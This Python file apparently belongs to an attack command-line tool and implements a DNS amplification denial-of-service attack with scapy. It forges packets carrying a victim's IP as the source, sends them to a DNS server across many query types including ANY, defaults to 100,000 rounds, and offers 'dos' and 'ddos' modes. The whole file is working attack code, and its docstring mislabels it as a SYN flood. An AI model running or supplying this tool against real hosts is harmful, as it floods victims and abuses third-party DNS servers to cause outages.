import click
from scapy.all import DNS, DNSQR, IP, UDP, send

from cli.utils.common import get_dns_ip, get_victim_ip

time_to_live = 128
query_name = "google.com"
query_type = [
    "ANY",
    "A",
    "AAAA",
    "CNAME",
    "MX",
    "NS",
    "PTR",
    "CERT",
    "SRV",
    "TXT",
    "SOA",
]


@click.command()
@click.option("-i", "--ip", help="IP address of the victim", type=str)
@click.option("--dns-ip", help="IP address of the DNS server", type=str)
@click.option(
    "-c", "--count", help="Number of packages to send", type=int, default=100000
)
@click.option(
    "-m",
    "--mode",
    help="Attack mode",
    type=click.Choice(["dos", "ddos"]),
    default="dos",
)
@click.pass_context
def dns_amplification(ctx, ip, dns_ip, count, mode):
    """SYN flood attack"""
    click.echo(
        "\n\n-------------------- DNS Amplification attack ---------------------\n"
    )
    if not ip:
        ip = get_victim_ip()
    if not dns_ip:
        dns_ip = get_dns_ip()
    click.echo(
        f"{mode} DNS Amplification attack on {ip} by DNS server {dns_ip} started!"
    )

    for _ in range(count):
        for i in range(len(query_type)):
            packet = (
                IP(src=ip, dst=dns_ip, ttl=time_to_live)
                / UDP()
                / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
            )
            send(packet, verbose=0)

    click.echo(f"{mode} Total {count * len(query_type)} packages sent\n")
